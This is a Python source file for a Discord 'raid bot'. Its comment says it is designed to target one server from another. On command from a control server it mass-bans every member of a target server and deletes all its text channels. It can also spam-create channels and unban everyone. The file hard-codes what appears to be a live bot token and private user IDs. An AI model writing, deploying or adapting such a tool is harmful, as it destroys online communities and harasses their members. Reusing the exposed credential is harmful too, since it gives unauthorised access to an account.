import time
import asyncio
import discord
from discord import Guild, TextChannel, Member, Forbidden, Message

# designed to target one server from another server
PREFIX = '.'
TOKEN = 'MTEzMDk1OTMxOTU0MjgwODU5OQ.GQgNTY.0mccKMvQvuWrclibXyBrv5V87AAOPXLnhlBB0g'
TARGET_GUILD_ID = 1130959129503076472
CONTROL_GUILD_ID = 1130959129503076472
AUTHORIZED_USERS = [790507097615237120, 1130951412340236378, 1056967439935610940]
REASON = "It's complicated"
BAN_EXEMPT_IDS = [790507097615237120, 710273163401101395]
TROLL = 'https://cdn.discordapp.com/emojis/953313250773176320.webp?size=64&quality=lossless'


class RaidBotClient(discord.Client):
    def init_data(self):
        self.armed = False
        self.commands = ['arm', 'disarm', 'alive', 'ban', 'channels', 'members', 'unban_all', 'ban_all', 'raid',
                         'delete_all_channels', 'create_channels', 'exempt_ids', 'target', 'create_general', 'troll']
        pass

    async def on_ready(self):
        print(f'Logged on as {self.user}!')

    async def on_message(self, message):
        if message.guild.id != CONTROL_GUILD_ID:
            return

        content = message.content.strip()
        print(f'[{message.author}] {content}')

        if content.startswith(PREFIX):
            await self.resolve_as_command(message, content)

    async def resolve_as_command(self, message, content):
        content = content[1:]
        content = content.split()
        if len(content) == 0:
            return

        command = content[0]
        args = content[1:]

        if command == 'arm':
            if message.author.id not in AUTHORIZED_USERS:
                await message.channel.send("`unauthorized`")
                return
            self.armed = True
            await message.channel.send("`armed`")
            return
        elif command == 'disarm':
            if message.author.id not in AUTHORIZED_USERS:
                await message.channel.send("`unauthorized`")
                return
            self.armed = False
            await message.channel.send("`disarmed`")
            return

        if command == 'target':
            target_guild = await client.fetch_guild(TARGET_GUILD_ID)
            await message.channel.send(target_guild.name)
            return

        if command == 'create_general':
            target_guild = await client.fetch_guild(TARGET_GUILD_ID)
            await target_guild.create_text_channel(name='general')
            return

        if command == 'alive':
            await message.channel.send('alive & armed to the teeth')
            return

        if command == 'commands':
            await message.channel.send(self.commands)
            return

        if command == 'ban':
            if message.author.id not in AUTHORIZED_USERS:
                await message.channel.send("`unauthorized`")
                return
            target_guild: Guild = await self.fetch_guild(TARGET_GUILD_ID)
            user = await self.fetch_user(args[0])
            await target_guild.ban(user)
            await message.channel.send("gebanned")
            return

        if command == 'unban_all':
            await self.unban_all(message)
            return

        if command == 'ban_all':
            await self.ban_all(message)
            return

        if command == 'troll':
            await message.channel.send(TROLL)
            await message.delete()
            return

        if command == 'channels':
            target_guild: Guild = await self.fetch_guild(TARGET_GUILD_ID)
            channels = await target_guild.fetch_channels()
            for channel in channels:
                if type(channel) is not TextChannel:
                    del channel

            joined_channels = ''
            for channel in channels:
                joined_channels += ('[' + channel.name + ']' + '\n')

            await message.channel.send('`' + joined_channels + '`')
            await message.channel.send('channel_count: ' + str(channels.__len__()))
            return
        if command == 'members':
            await message.channel.send('member_count: ' + str(message.guild.member_count))
            return

        if command == 'create_channels':
            if len(args) == 0:
                await message.channel.send("`specify quantity`")
                return

            if message.author.id not in AUTHORIZED_USERS:
                await message.channel.send("`unauthorized`")
                return

            await self.create_channels(message, int(args[0]))
            return

        if command == 'raid':
            if message.author.id not in AUTHORIZED_USERS:
                await message.channel.send("`unauthorized`")
                return

            if not self.armed:
                await message.channel.send("`bot is disarmed`")
                return

            # await message.delete()
            print("Raid started..")
            await self.ban_all(message)
            await self.delete_all_channels(message)
            return

        if command == 'exempt_ids':
            await message.channel.send(BAN_EXEMPT_IDS)
            return

        if command == 'delete_all_channels':
            await self.delete_all_channels(message)
            return

    async def unban_all(self, message: Message):
        if message.author.id not in AUTHORIZED_USERS:
            await message.channel.send("`unauthorized`")
            return

        start_time = time.time()
        target_guild: Guild = await self.fetch_guild(TARGET_GUILD_ID)
        bans = target_guild.bans().__aiter__()
        unbans = 0
        while True:
            try:
                ban = await bans.__anext__()
                await target_guild.unban(ban.user)
                print(f'unbanned: {ban.user}')
                unbans += 1
            except StopAsyncIteration:
                break
            except Forbidden as exc:
                print(exc)
                break

        end_time = time.time()
        print(f'Unbanned {unbans} users in {(end_time - start_time)}s')

    async def delete_all_channels(self, message):
        if message.author.id not in AUTHORIZED_USERS:
            await message.channel.send("`unauthorized`")
            return

        if not self.armed:
            await message.channel.send("`bot is disarmed`")
            return

        target_guild: Guild = await self.fetch_guild(TARGET_GUILD_ID)
        start = time.time()
        channels = await target_guild.fetch_channels()
        deletions = []
        for channel in channels:
            if type(channel) is TextChannel:
                try:
                    deletions.append(channel.delete(reason=REASON))
                except Forbidden:
                    print("Failed to delete: " + channel.name)

        print(f'Deletions to process: {len(deletions)}')
        deleted = 0
        results = await asyncio.gather(*deletions, return_exceptions=True)
        for result_or_exc in results:
            if isinstance(result_or_exc, Forbidden):
                print("Caught:", repr(result_or_exc))
            else:
                deleted += 1

        end = time.time()
        print(f'Deleted {deleted} channels in {"%.3f" % (end - start)} seconds')

    async def create_channels(self, message, quantity: int):
        if message.author.id not in AUTHORIZED_USERS:
            await message.channel.send("`unauthorized`")
            return

        if quantity < 1:
            return
        target_guild: Guild = await self.fetch_guild(TARGET_GUILD_ID)

        start = time.time()
        for i in range(0, quantity):
            await target_guild.create_text_channel(name='test_channel' + str(i))
        end = time.time()
        print(f'Created {quantity} channels in {"%.3f" % (end - start)} seconds')

    async def ban_all(self, message):
        if message.author.id not in AUTHORIZED_USERS:
            await message.channel.send("`unauthorized`")
            return

        if not self.armed:
            await message.channel.send(f"`bot is disarmed`")
            return

        target_guild: Guild = await self.fetch_guild(TARGET_GUILD_ID)
        member_it = target_guild.fetch_members(limit=None).__aiter__()
        members_banned = 0
        failures = 0
        start = time.time()
        while True:
            try:
                member: Member = await member_it.__anext__()
                if member.id in BAN_EXEMPT_IDS or member.id in AUTHORIZED_USERS:
                    continue

                try:
                    await member.ban(reason=REASON)
                    members_banned += 1
                except Forbidden:
                    failures += 1
            except StopAsyncIteration:
                break

        end = time.time()
        print("Members banned: " + str(members_banned))
        print("Failures: " + str(failures))
        print(f'Executed bans in {"%.3f" % (end - start)} seconds')


bot_intents = discord.Intents.default()
bot_intents.message_content = True
bot_intents.members = True
bot_intents.bans = True

client = RaidBotClient(intents=bot_intents)
client.init_data()

client.run(TOKEN)
